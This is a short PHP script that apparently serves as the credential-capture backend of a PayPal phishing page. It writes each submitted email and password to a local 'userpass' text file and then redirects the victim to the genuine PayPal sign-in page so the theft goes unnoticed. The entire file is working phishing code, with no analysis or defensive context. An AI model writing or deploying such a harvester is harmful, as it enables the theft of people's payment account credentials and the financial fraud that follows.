<?php

file_put_contents("../userpass/usernames.txt", "Paypal Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.com/signin');
exit();
?>